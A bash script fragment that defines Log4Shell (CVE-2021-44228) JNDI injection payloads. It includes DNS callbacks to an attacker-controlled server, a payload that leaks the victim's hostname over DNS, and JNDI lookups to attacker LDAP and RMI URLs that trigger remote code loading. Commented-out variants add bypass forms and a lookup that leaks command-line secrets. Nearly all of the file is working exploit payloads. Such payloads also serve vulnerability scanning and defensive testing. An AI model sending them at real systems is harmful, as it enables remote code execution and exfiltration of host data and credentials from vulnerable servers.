#!/bin/bash
#==========================================================================================
# JNDI payloads
#
# References:
# - DNS: https://docs.oracle.com/javase/8/docs/technotes/guides/jndi/jndi-dns.html
# - RMI: https://docs.oracle.com/javase/8/docs/technotes/guides/jndi/jndi-rmi.html#FORM
#
# Cheats:
# {jndi:dns://dnsserver.com/somedomain} 
#==========================================================================================
# Simple injection test by showing the value of Java System Property user name (user.name) in log message 
PAYLOAD[1]="\${sys:user.name}"

# Uing a string such as ${jndi:dns://dnsserver.com/somedomain} will cause the victim server to send a DNS query 
# to dnsserver.com (querying about the somedomain DNS record). This can be used to detect vulnerable log4j instances, 
# tunnel back data or even as a DDoS attack (given enough vulnerable services)
PAYLOAD[2]="\${jndi:dns://${DNS_SERVER}/${DNS_RECORD}}"

# Leak the local hostname via DNS
PAYLOAD[3]="\${jndi:dns://${DNS_SERVER}/\${env:HOSTNAME}.${DNS_RECORD}}"

# Try JNDI exploits (log4shell, CVE-2021-44228)
PAYLOAD[4]="\${jndi:${ATTACKER_LDAP_URL}}"
PAYLOAD[5]="\${jndi:${ATTACKER_RMI_URL}}"

NUM_PAYLOADS=4

#PAYLOAD[5]="\${jndi:java:comp/env}"
#PAYLOAD[X]="\${jndi:ldap://127.0.0.1#${ATTACKER_URL}:${ATTACKER_LDAP_PORT}/a}"
#PAYLOAD[X]="\${jndi:ldap://${env:HOSTNAME}.${ATTACKER_URL}:${ATTACKER_LISTENER_PORT}/foo3}"
# ${main:x} – leak the value of command line argument #x, which may contain sensitive data such as passwords or access keys passed through the command line.
#PAYLOAD[X]="\${main:x}"
#JAVA_ALPINE_VERSION=8.181.13-r0
#HOSTNAME=5586c21a5245
##HOME=/app
#JAVA_VERSION=8u181
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
#JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk
#PWD=/src